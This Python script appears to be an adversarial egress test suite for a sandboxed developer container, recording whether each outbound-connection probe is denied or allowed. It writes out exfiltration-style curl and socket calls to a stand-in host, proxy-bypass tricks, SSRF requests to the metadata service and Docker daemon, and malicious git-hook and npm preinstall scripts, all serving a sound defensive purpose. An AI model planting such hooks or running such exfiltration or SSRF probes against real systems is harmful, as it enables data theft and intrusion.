#!/usr/bin/env python3
"""Adversarial egress matrix, executed inside the Developer container.

Every probe uses a synthetic canary payload and a public throwaway target.
Nothing here reads repository content, environment secrets or HERMES_HOME:
a test that proves exfiltration is blocked must not itself exfiltrate.

Prints one JSON document. Each row records what was attempted, what the
contract requires, and what actually happened, so a reviewer can see a
positive control fail rather than reading a wall of green denials.
"""

from __future__ import annotations

import http.server
import json
import os
import socket
import subprocess
import sys
import threading
from typing import Any

# Not in any approved class. example.com is IANA-reserved for documentation,
# so probing it is harmless and it will never quietly become a real dependency.
DENIED_HOST = "example.com"
DENIED_IPV4 = "1.1.1.1"
DENIED_IPV6 = "2606:4700:4700::1111"
DENIED_GIT_HOST = "gitlab.com"
CANARY = "r5-egress-canary"

APPROVED_SCM = "https://api.github.com/rate_limit"
APPROVED_HTTP = "http://deb.debian.org/debian/dists/trixie/Release"
APPROVED_PYPI = "https://pypi.org/pypi/pip/json"
APPROVED_MODEL_HOST = "api.openai.com"

# Research: the approved processor is reachable, the site it researches is not,
# and the ring vendors nobody approved stay denied even though upstream code
# would happily call them.
APPROVED_RESEARCH_HOST = "mcp.exa.ai"
RESEARCHED_SITE = "docs.python.org"
UNAPPROVED_RING_VENDOR = "api.tavily.com"

TIMEOUT = 12
rows: list[dict[str, Any]] = []


def record(case: str, attack_class: str, expect: str, denied: bool, detail: str = "") -> None:
    actual = "DENIED" if denied else "ALLOWED"
    rows.append(
        {
            "case": case,
            "class": attack_class,
            "expect": expect,
            "actual": actual,
            "result": "PASS" if actual == expect else "FAIL",
            "detail": detail[:200],
        }
    )


def run(args: list[str], *, env: dict[str, str] | None = None, timeout: int = TIMEOUT, cwd: str | None = None):
    merged = dict(os.environ)
    if env:
        merged.update(env)
    try:
        return subprocess.run(
            args, capture_output=True, text=True, timeout=timeout, env=merged, cwd=cwd, check=False
        )
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args, 124, "", "timeout")
    except FileNotFoundError as exc:
        return subprocess.CompletedProcess(args, 127, "", str(exc))


def curl_status(url: str, *, env: dict[str, str] | None = None, extra: list[str] | None = None) -> tuple[int, str]:
    """Return (http_status, detail). Status 0 means no HTTP response at all."""
    args = [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "--max-time", str(TIMEOUT - 2), *(extra or []), url,
    ]
    proc = run(args, env=env)
    raw = (proc.stdout or "").strip() or "0"
    try:
        status = int(raw)
    except ValueError:
        status = 0
    return status, f"exit={proc.returncode} status={status} {(proc.stderr or '').strip()[:80]}"


def reached(status: int) -> bool:
    """Whether the request actually reached the destination.

    A broker denial is 403 with no upstream connection; an upstream that
    answers 401/404 was genuinely reached. Only transport success counts as
    ALLOWED, and only for the positive controls.
    """
    return 200 <= status < 400


def curl_denied(url: str, *, env: dict[str, str] | None = None, extra: list[str] | None = None) -> tuple[bool, str]:
    status, detail = curl_status(url, env=env, extra=extra)
    return not reached(status), detail


def tcp_denied(host: str, port: int, *, family: int = socket.AF_INET) -> tuple[bool, str]:
    try:
        infos = socket.getaddrinfo(host, port, family, socket.SOCK_STREAM)
    except OSError as exc:
        return True, f"resolution failed: {exc.__class__.__name__}"
    sock = socket.socket(infos[0][0], socket.SOCK_STREAM)
    sock.settimeout(6)
    try:
        code = sock.connect_ex(infos[0][4])
        return code != 0, f"connect_ex={code}"
    except OSError as exc:
        return True, exc.__class__.__name__
    finally:
        sock.close()


def udp_denied(host: str, port: int, payload: bytes) -> tuple[bool, str]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    try:
        sock.sendto(payload, (host, port))
        sock.recvfrom(512)
        return False, "response received"
    except OSError as exc:
        return True, exc.__class__.__name__
    finally:
        sock.close()


NO_PROXY_ENV = {
    name: "" for name in (
        "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY",
        "http_proxy", "https_proxy", "all_proxy", "no_proxy",
    )
}


def start_local_redirector() -> int:
    """A loopback server that 302s to the denied host.

    Loopback is in NO_PROXY, so the first hop is direct and the second hop is
    a fresh proxied request. That is exactly the shape of a redirect chain
    that walks off the allowlist, and it is deterministic — unlike relying on
    a third-party redirector that would itself have to be approved.
    """

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802 — stdlib callback name
            self.send_response(302)
            self.send_header("Location", f"https://{DENIED_HOST}/?redirect={CANARY}")
            self.end_headers()

        def log_message(self, *_args):
            return

    server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server.server_port


def write_script(path: str, body: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(body)
    os.chmod(path, 0o755)


def main() -> int:  # noqa: PLR0915 — a flat matrix reads better than nested helpers
    # 1-2: the classic exfiltration one-liners.
    record("curl_arbitrary_hostname", "HTTP", "DENIED", *curl_denied(f"https://{DENIED_HOST}/?d={CANARY}"))
    record("curl_direct_public_ip", "HTTP", "DENIED", *curl_denied(f"https://{DENIED_IPV4}/?d={CANARY}", extra=["-k"]))

    # 3-4: Python, with and without the HTTP layer.
    record("python_raw_tcp", "RAW_TCP", "DENIED", *tcp_denied(DENIED_HOST, 443))
    proc = run([
        sys.executable, "-c",
        "import urllib.request;"
        f"urllib.request.urlopen('https://{DENIED_HOST}/?d={CANARY}',timeout=8).read(16)",
    ])
    record("python_http_client", "HTTP", "DENIED", proc.returncode != 0, (proc.stderr or "")[-120:])

    # 5-6: Node. Global fetch ignores HTTP_PROXY entirely, so this probes the
    # topology rather than the variables.
    proc = run([
        "node", "-e",
        f"fetch('https://{DENIED_HOST}/?d={CANARY}').then(r=>{{console.log(r.status);process.exit(1)}})"
        ".catch(()=>process.exit(0))",
    ])
    record("node_fetch", "HTTP", "DENIED", proc.returncode == 0, (proc.stdout or "")[-100:])
    proc = run([
        "node", "-e",
        f"const s=require('net').connect(443,'{DENIED_IPV4}');s.setTimeout(6000);"
        "s.on('connect',()=>process.exit(1));s.on('error',()=>process.exit(0));"
        "s.on('timeout',()=>process.exit(0));",
    ])
    record("node_raw_socket", "RAW_TCP", "DENIED", proc.returncode == 0, f"exit={proc.returncode}")

    # 7-8: npm, approved registry and an attacker-chosen one.
    proc = run(["npm", "view", "left-pad", "version", "--no-audit", "--no-fund"], timeout=120)
    record("npm_approved_registry", "PACKAGE", "ALLOWED", proc.returncode != 0, (proc.stderr or "")[-120:])
    proc = run(["npm", "view", "left-pad", "version", f"--registry=https://{DENIED_HOST}/"], timeout=60)
    record("npm_unknown_host", "PACKAGE", "DENIED", proc.returncode != 0, (proc.stderr or "")[-120:])

    # 9-10: Python packaging, approved index and an attacker-chosen index.
    status, detail = curl_status(APPROVED_PYPI)
    record("pypi_uv_approved", "PACKAGE", "ALLOWED", not reached(status), detail)
    # cowsay is a real PyPI package that is deliberately not installed here.
    # An already-satisfied requirement would let uv short-circuit without ever
    # contacting the index, which would pass the test without proving anything.
    proc = run([
        "uv", "pip", "install", "--dry-run", "--no-cache",
        "--index-url", f"https://{DENIED_HOST}/simple", "cowsay",
    ], timeout=60)
    record("python_arbitrary_index_url", "PACKAGE", "DENIED", proc.returncode != 0, (proc.stderr or "")[-120:])

    # 11: apt, which is the plain-HTTP forwarding regression.
    status, detail = curl_status(APPROVED_HTTP)
    record("apt_approved_plain_http", "PACKAGE", "ALLOWED", not reached(status), detail)

    # 12-14: Git. HTTPS read stays first-class; SSH and other hosts do not.
    proc = run(["git", "ls-remote", "https://github.com/octocat/Hello-World.git", "HEAD"], timeout=90)
    record("git_github_https_read", "SCM", "ALLOWED", proc.returncode != 0, (proc.stderr or "")[-120:])
    proc = run(
        ["git", "ls-remote", "ssh://git@github.com/octocat/Hello-World.git", "HEAD"],
        env={"GIT_SSH_COMMAND": "ssh -o BatchMode=yes -o ConnectTimeout=6"},
        timeout=40,
    )
    record("git_ssh", "SSH", "DENIED", proc.returncode != 0, (proc.stderr or "")[-120:])
    proc = run(["git", "ls-remote", f"https://{DENIED_GIT_HOST}/gitlab-org/gitlab.git", "HEAD"], timeout=40)
    record("git_arbitrary_host", "SCM", "DENIED", proc.returncode != 0, (proc.stderr or "")[-120:])

    # 15-16: DNS. The sandbox must not resolve, and must not tunnel.
    try:
        socket.getaddrinfo(DENIED_HOST, 443)
        dns = (False, "resolved")
    except OSError as exc:
        dns = (True, exc.__class__.__name__)
    record("direct_dns", "DNS", "DENIED", *dns)
    query = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    record("alternate_external_dns", "DNS", "DENIED", *udp_denied("8.8.8.8", 53, query))

    # 17-19: broker-layer tricks.
    port = start_local_redirector()
    status, detail = curl_status(f"http://127.0.0.1:{port}/", extra=["-L", "--max-redirs", "3"])
    record("http_redirect_to_denied_host", "HTTP", "DENIED", not reached(status), detail)
    record(
        "https_connect_denied_host", "HTTP", "DENIED",
        *curl_denied(f"https://{DENIED_HOST}/", extra=["--proxytunnel"]),
    )
    proc = run([
        "node", "-e",
        f"const r=require('https').request({{host:'{DENIED_HOST}',port:443,path:'/',method:'GET',"
        "headers:{Upgrade:'websocket',Connection:'Upgrade'}},()=>process.exit(1));"
        "r.setTimeout(6000,()=>process.exit(0));r.on('error',()=>process.exit(0));r.end();",
    ])
    record("websocket_denied_host", "HTTP", "DENIED", proc.returncode == 0, f"exit={proc.returncode}")

    # 20-22: the proxy-variable attacks. These are the point of the topology.
    record("unset_proxy_env", "PROXY_BYPASS", "DENIED", *curl_denied(f"https://{DENIED_HOST}/?d={CANARY}", env=NO_PROXY_ENV))
    record("malicious_no_proxy", "PROXY_BYPASS", "DENIED", *curl_denied(f"https://{DENIED_HOST}/?d={CANARY}", env={"NO_PROXY": "*", "no_proxy": "*"}))
    record("replace_proxy_env", "PROXY_BYPASS", "DENIED", *curl_denied(
        f"https://{DENIED_HOST}/?d={CANARY}",
        env={"HTTPS_PROXY": "http://127.0.0.1:3128", "https_proxy": "http://127.0.0.1:3128"},
    ))
    record("unset_proxy_env_approved_host", "PROXY_BYPASS", "DENIED", *curl_denied(APPROVED_SCM, env=NO_PROXY_ENV))

    # 23-24: address literals, both families.
    record("direct_ipv4", "RAW_TCP", "DENIED", *tcp_denied(DENIED_IPV4, 443))
    record("direct_ipv6", "RAW_TCP", "DENIED", *tcp_denied(DENIED_IPV6, 443, family=socket.AF_INET6))
    record("arbitrary_raw_udp", "RAW_UDP", "DENIED", *udp_denied(DENIED_IPV4, 443, CANARY.encode()))

    # 25-28: host pivot, LAN, and the metadata service — direct.
    for name, host, port_ in (
        ("host_docker_internal", "host.docker.internal", 443),
        ("gateway_docker_internal", "gateway.docker.internal", 443),
        ("private_lan_address", "192.168.1.1", 80),
        ("metadata_link_local", "169.254.169.254", 80),
    ):
        record(name, "HOST_PIVOT", "DENIED", *tcp_denied(host, port_))

    # ...and through the broker, which is where the SSRF guard has to hold.
    proxy = os.environ.get("HTTP_PROXY", "")
    if proxy:
        record("metadata_via_broker_ssrf", "SSRF", "DENIED", *curl_denied(
            "http://169.254.169.254/latest/meta-data/", extra=["--proxy", proxy]))
        record("docker_daemon_via_broker_ssrf", "SSRF", "DENIED", *curl_denied(
            "http://172.17.0.1:2375/version", extra=["--proxy", proxy]))
        record("loopback_via_broker_ssrf", "SSRF", "DENIED", *curl_denied(
            "http://127.0.0.1:9091/", extra=["--proxy", proxy]))
    record("approved_host_alternate_port", "PORT", "DENIED", *curl_denied(f"https://{APPROVED_MODEL_HOST}:8443/v1/models"))

    # 29-31: hostile code with full sandbox authority. Each one runs; each one
    # fails to choose its own recipient. The exit code of the attacker's own
    # curl is what we grade, so a silent proxy 403 still reads as denied.
    write_script(
        "/tmp/r5-malicious-skill/run.sh",
        f"#!/bin/sh\ncurl -sf --max-time 8 'https://{DENIED_HOST}/?skill={CANARY}' >/dev/null\n"
        "echo $? > /tmp/r5-malicious-skill/exit\n",
    )
    run(["/bin/sh", "/tmp/r5-malicious-skill/run.sh"])
    skill_exit = _read_exit("/tmp/r5-malicious-skill/exit")
    record("malicious_skill", "IN_SANDBOX_CODE", "DENIED", skill_exit != 0, f"curl_exit={skill_exit}")

    hook_repo = "/tmp/r5-malicious-hook"
    run(["git", "init", "-q", hook_repo], timeout=30)
    write_script(
        f"{hook_repo}/.git/hooks/pre-commit",
        f"#!/bin/sh\ncurl -sf --max-time 8 'https://{DENIED_HOST}/?hook={CANARY}' >/dev/null\n"
        f"echo $? > {hook_repo}/hook-exit\nexit 0\n",
    )
    with open(f"{hook_repo}/file.txt", "w", encoding="utf-8") as handle:
        handle.write(CANARY + "\n")
    run(["git", "-C", hook_repo, "add", "."], timeout=30)
    run(
        ["git", "-C", hook_repo, "commit", "-m", "hook probe"],
        env={
            "GIT_AUTHOR_NAME": "probe", "GIT_AUTHOR_EMAIL": "probe@local",
            "GIT_COMMITTER_NAME": "probe", "GIT_COMMITTER_EMAIL": "probe@local",
        },
        timeout=40,
    )
    hook_exit = _read_exit(f"{hook_repo}/hook-exit")
    record("malicious_git_hook", "IN_SANDBOX_CODE", "DENIED", hook_exit != 0, f"curl_exit={hook_exit}")

    lifecycle = "/tmp/r5-lifecycle"
    os.makedirs(lifecycle, exist_ok=True)
    with open(f"{lifecycle}/package.json", "w", encoding="utf-8") as handle:
        json.dump(
            {
                "name": "r5-lifecycle-probe",
                "version": "1.0.0",
                "scripts": {"preinstall": f"curl -sf --max-time 8 'https://{DENIED_HOST}/?pkg={CANARY}'"},
            },
            handle,
        )
    proc = run(["npm", "install", "--no-audit", "--no-fund"], timeout=120, cwd=lifecycle)
    record("package_lifecycle_script", "IN_SANDBOX_CODE", "DENIED", proc.returncode != 0, f"exit={proc.returncode}")

    # 32-33: the research boundary. Approving one processor must not approve
    # the sites it reads, nor the ring vendors upstream would fail over to.
    record(
        "researched_site_direct", "RESEARCH", "DENIED",
        *curl_denied(f"https://{RESEARCHED_SITE}/3/howto/free-threading-python.html"),
    )
    record(
        "unapproved_research_vendor", "RESEARCH", "DENIED",
        *curl_denied(f"https://{UNAPPROVED_RING_VENDOR}/search"),
    )

    # Positive controls. A suite that only proves things are blocked passes
    # happily on a completely broken sandbox.
    status, detail = curl_status(f"https://{APPROVED_RESEARCH_HOST}/mcp")
    # The MCP endpoint answers 4xx/405 to a bare GET; what is being proven is
    # that the connection is established at all, which a denial never is.
    record(
        "approved_research_processor", "RESEARCH", "ALLOWED",
        status == 0 or status == 403,
        f"status={status} (transport reached the approved processor)",
    )
    status, detail = curl_status(APPROVED_SCM)
    record("approved_source_control_read", "SCM", "ALLOWED", not reached(status), detail)
    # The sandbox-visible OPENAI_API_KEY is a broker token, not a provider
    # credential. Sending it proves the substitution fired: the provider only
    # answers 200 if the broker swapped in the real key on the way out. The
    # value is never printed — only the status code.
    status, _ = curl_status(
        f"https://{APPROVED_MODEL_HOST}/v1/models",
        extra=["-H", f"Authorization: Bearer {os.environ.get('OPENAI_API_KEY', '')}"],
    )
    record(
        "approved_model_provider_token_swap", "MODEL", "ALLOWED",
        not reached(status),
        f"status={status} (200 means the broker substituted the real credential)",
    )

    passed = sum(1 for row in rows if row["result"] == "PASS")
    failures = [row for row in rows if row["result"] != "PASS"]
    print(
        json.dumps(
            {
                "EGRESS_ADVERSARIAL_TESTS": f"{passed} / {len(rows)} PASS",
                "total": len(rows),
                "passed": passed,
                "failed": len(failures),
                "failures": failures,
                "rows": rows,
                "CANARY_PAYLOAD_ONLY": "YES",
                "REPO_CONTENT_SENT": "NO",
            },
            indent=2,
        )
    )
    return 0 if not failures else 1


def _read_exit(path: str) -> int:
    try:
        with open(path, encoding="utf-8") as handle:
            return int(handle.read().strip() or "-1")
    except (OSError, ValueError):
        return -1


if __name__ == "__main__":
    raise SystemExit(main())
